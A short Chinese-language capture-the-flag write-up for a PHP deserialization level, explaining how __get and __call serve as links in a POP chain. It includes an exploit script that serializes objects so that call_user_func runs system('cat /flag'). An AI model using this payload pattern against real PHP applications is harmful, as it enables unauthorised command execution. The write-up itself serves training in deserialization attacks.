# WriteUP · Level 26 · 魔术方法跳板 __get / __call

## 原理

- 访问**不存在的属性** → 触发 `__get($name)`;
- 调用**不存在的方法** → 触发 `__call($name, $args)`。

它们是 POP 链里最常见的"跳板":把上一环的出口变成下一环的入口,
终点往往落在 `call_user_func` 这类可变函数调用上。

## 链条

```
$obj->tj_anything        (不存在属性)
  → TJ_TRIGGER::__get
    → $this->helloctf_obj->run()   (不存在方法)
      → HELLOCTF_CALL::__call
        → call_user_func($tj_fn, $probiusofficial_arg)
```

## EXP

```php
<?php
class TJ_TRIGGER { public $helloctf_obj; }
class HELLOCTF_CALL { public $tj_fn; public $probiusofficial_arg; }

$h = new HELLOCTF_CALL();
$h->tj_fn = 'system';
$h->probiusofficial_arg = 'cat /flag';

$t = new TJ_TRIGGER();
$t->helloctf_obj = $h;

echo "o=" . urlencode(serialize($t));
```
